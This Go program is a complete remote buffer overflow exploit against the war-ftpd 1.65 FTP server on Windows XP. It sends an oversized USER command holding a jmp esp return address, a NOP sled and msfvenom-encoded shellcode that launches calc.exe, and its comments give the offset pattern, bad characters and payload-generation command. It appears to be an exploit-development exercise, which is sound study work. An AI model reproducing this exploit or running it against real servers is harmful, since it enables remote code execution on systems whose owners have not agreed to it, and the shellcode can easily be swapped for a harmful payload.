package main

import (
	"fmt"
	"net"
	"os"
	"bufio"
	"io"
	"time"
	"strings"
)

//485

func receive(conn net.Conn, reader *bufio.Reader) {
	conn.SetReadDeadline(time.Now().Add(3 * time.Second))
	for {
		line, err := reader.ReadString('\n')

		if err == io.EOF {
			break
		} else if err != nil {
			return
		}

		fmt.Println(string(line))
	}
}
const (
   VulnerableBuffSize = 485
   OverflowBuffSize = 1024
)
func main() {
	//jmp esp found at 7c941eed (ntdll)
	//ntdll - 7C913156  NT 5.1.2600.2180
	//username := "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B"
	//strings.Repeat("A", 1048)

	//msfvenom --payload-options -p windows/exec

	//Command for generate payload
	//Bad characters '\x00\x0A\x40\x0D'
	//msfvenom -p windows/exec cmd=calc.exe exitfunc=seh -b '\x00\x0A\x40\x0D' -f py
	//executes calc.exe and terminate war-ftpd 1.65
	buf :=  ""
	buf += "\xda\xd6\xba\xf2\xa0\xb2\xb0\xd9\x74\x24\xf4\x5e\x33"
	buf += "\xc9\xb1\x31\x31\x56\x18\x83\xee\xfc\x03\x56\xe6\x42"
	buf += "\x47\x4c\xee\x01\xa8\xad\xee\x65\x20\x48\xdf\xa5\x56"
	buf += "\x18\x4f\x16\x1c\x4c\x63\xdd\x70\x65\xf0\x93\x5c\x8a"
	buf += "\xb1\x1e\xbb\xa5\x42\x32\xff\xa4\xc0\x49\x2c\x07\xf9"
	buf += "\x81\x21\x46\x3e\xff\xc8\x1a\x97\x8b\x7f\x8b\x9c\xc6"
	buf += "\x43\x20\xee\xc7\xc3\xd5\xa6\xe6\xe2\x4b\xbd\xb0\x24"
	buf += "\x6d\x12\xc9\x6c\x75\x77\xf4\x27\x0e\x43\x82\xb9\xc6"
	buf += "\x9a\x6b\x15\x27\x13\x9e\x67\x6f\x93\x41\x12\x99\xe0"
	buf += "\xfc\x25\x5e\x9b\xda\xa0\x45\x3b\xa8\x13\xa2\xba\x7d"
	buf += "\xc5\x21\xb0\xca\x81\x6e\xd4\xcd\x46\x05\xe0\x46\x69"
	buf += "\xca\x61\x1c\x4e\xce\x2a\xc6\xef\x57\x96\xa9\x10\x87"
	buf += "\x79\x15\xb5\xc3\x97\x42\xc4\x89\xfd\x95\x5a\xb4\xb3"
	buf += "\x96\x64\xb7\xe3\xfe\x55\x3c\x6c\x78\x6a\x97\xc9\x78"
	buf += "\x9b\x2a\xc7\xed\x02\xdf\xaa\x73\xb5\x35\xe8\x8d\x36"
	buf += "\xbc\x90\x69\x26\xb5\x95\x36\xe0\x25\xe7\x27\x85\x49"
	buf += "\x54\x47\x8c\x29\x3b\xdb\x4c\x80\xde\x5b\xf6\xdc"

	// 220 bytes

	jmpEspCommand := "\xED\x1E\x94\x7C" // addrress of ntdll "jmp esp"
	password := "whatever"
	int3opcode := "\xCC" // 'INT 3' system interrupt see https://en.wikipedia.org/wiki/INT_(x86_instruction)
	nopeOpcode := "\x90"
	username := fmt.Sprintf("%v%v%v%v%v",
		strings.Repeat("A", VulnerableBuffSize),
		jmpEspCommand, // 4 bytes
		strings.Repeat(nopeOpcode, 16), // 16 bytes
		buf,
		strings.Repeat(int3opcode, OverflowBuffSize - VulnerableBuffSize - 4 - 16 - 220))
	if len(os.Args) > 1 {
		hostAddress := os.Args[1]
		fmt.Println("Host Address: ", hostAddress)
		conn, err := net.Dial("tcp", fmt.Sprintf("%v:21", hostAddress))

		defer conn.Close()
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}
		reader := bufio.NewReader(conn)

		fmt.Fprintf(conn, "USER %v", username)
		fmt.Println("[+] Sending user name")
		receive(conn, reader)

		fmt.Println("[+] Sending password")
		fmt.Fprintf(conn, "PASS %v\r\n", password)
		receive(conn, reader)
	}
}
